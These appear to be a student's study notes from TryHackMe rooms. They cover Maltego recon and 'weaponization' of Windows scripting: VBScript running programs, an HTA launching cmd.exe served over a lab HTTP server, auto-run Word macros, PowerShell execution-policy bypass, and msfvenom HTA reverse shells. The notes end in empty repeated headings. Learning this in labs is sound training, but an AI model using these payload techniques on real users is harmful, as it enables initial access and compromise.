`Domain → IP Address → DNS Names → IP Location`

<img width="1162" height="422" alt="image" src="https://github.com/user-attachments/assets/e5f6079d-b179-4243-b4d7-06ff09d4373f" />

1. Right-click domain → Standard Transforms → Resolve to IP → To IP Address (DNS).
2. Right-click IP → DNS from IP → To DNS Name from passive DNS (Robtex).

<img width="1162" height="422" alt="image" src="https://github.com/user-attachments/assets/4cbaff78-9503-457c-8167-eb25591691cf" />

**Important:** Some transforms actively contact targets. Check before using if you want passive recon only.

#### **More Information**

`whois` and `nslookup` results can also be visualized in Maltego.

[Transform Hub](https://www.maltego.com/transform-hub/?utm_source=chatgpt.com) – Find additional transforms.

**Maltego CE:** Free Community Edition, but requires activation. Some transforms are paid.

**Remember:** Maltego uses transforms to automatically discover and visualize relationships between entities.




## Weaponization

<img width="920" height="560" alt="image" src="https://github.com/user-attachments/assets/336285cb-7f64-475c-a97f-aec6fa5dd3f9" />

### --------------------------------- Introduction -----------------------------------

**Weaponization:** 2nd stage of Cyber Kill Chain. Attacker creates malicious payloads (PDF, Word, etc.) to gain initial access.

**Purpose:** Deliver malicious code and connect back to the attacker's C2.

**Delivery methods:** Phishing, social engineering, USB, browser/software exploits, web.

**Why custom payloads?** Organizations often block `.exe` files.

[Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html?utm_source=chatgpt.com) , [Red Teaming Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit?utm_source=chatgpt.com#Payload%20Development)


### --------------------------------- Windows Scripting Host - WSH -----------------------------------

**WSH:** Built-in Windows tool that runs scripts to automate tasks.

**Engines:**\
`wscript.exe` = GUI scripts\
`cscript.exe` = Command-line scripts

**VBScript:** Runs with the same permissions as the current user.

[VBScript](https://en.wikipedia.org/wiki/VBScript?utm_source=chatgpt.com)

##### **Basic VBScript**

```
Dim message 
message = "Welcome to THM"
MsgBox message
```

`Dim` = Create variable. `MsgBox` = Show message box.

##### **Execute EXE using VBScript**

```
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

`CreateObject` = Create WScript object. `Run` = Execute program.

##### **Execute Scripts**

```
wscript C:\Users\thm\Desktop\payload.vbs
cscript.exe C:\Users\thm\Desktop\payload.vbs
```

##### **Run VBScript with .txt Extension**

```
wscript /e:VBScript C:\Users\thm\Desktop\payload.txt
```

`/e:VBScript` = Specify the script engine.

**Remember:** WSH runs `.vbs` scripts using `wscript.exe` or `cscript.exe`.


### --------------------------------- An HTML Application - HTA -----------------------------------

**HTA:** HTML file containing HTML, JScript or VBScript. Can execute Windows commands using `mshta.exe` (LOLBIN).

**ActiveXObject:** Allows interaction with Windows components.

#### **Basic HTA**

```
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

#### **Serve HTA**

```
python3 -m http.server 8090
```

URL: `http://10.8.232.37:8090/payload.hta`

#### **Important Concepts**

**HTA Reverse Shell:** Uses `msfvenom` to generate an HTA payload.

**Metasploit HTA Module:** `exploit/windows/misc/hta_server`

**Remember:** HTA files can execute Windows commands and are launched using `mshta.exe`.

[ActiveXObject](https://en.wikipedia.org/wiki/ActiveX?utm_source=chatgpt.com)


### --------------------------------- Visual Basic for Application - VBA -----------------------------------

**VBA:** Microsoft Office scripting language (Word, Excel, PowerPoint). Used to automate tasks through Macros.

**Macro:** Office document containing VBA code.

[Windows API](https://en.wikipedia.org/wiki/Windows_API?utm_source=chatgpt.com) | [VBA](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications?utm_source=chatgpt.com)

#### **Basic Macro**

```
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Run: `F5`

#### **Auto-execution**

`AutoOpen()` and `Document_Open()` execute macros when a Word document opens.

```
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

**Macro-enabled formats:** `.doc`, `.docm`

#### **Important Concepts**

**Execute EXE:** VBA can use WSH (`Wscript.Shell`) to run programs.

**Security:** User may need to click **Enable Content**. Macros alone don't bypass detection.

**Combining:** VBA + WSH + HTA.

**Remember:** `Workbook_Open()` = Excel; `Document_Open()` = Word.


### --------------------------------- PowerShell - PSH -----------------------------------

**PowerShell:** Windows scripting language used for automation, system enumeration and administration.

[THM PowerShell Room](https://tryhackme.com/room/powershell?utm_source=chatgpt.com)

#### **Basic Script**

```
Write-Output "Welcome to the Weaponization Room!"
```

Run:

```
powershell -File thm.ps1
```

#### **Execution Policy**

Default: `Restricted` = Scripts cannot run.

```
Get-ExecutionPolicy
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```

**Bypass:**

```
powershell -ex bypass -File thm.ps1
```

#### **Powercat**

[Powercat GitHub](https://github.com/besimorhino/powercat?utm_source=chatgpt.com) – PowerShell networking tool.

**Remember:** PowerShell scripts use `.ps1`; Execution Policy controls script execution.



## Password Attacks

### --------------------------------- Maltego -----------------------------------



### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
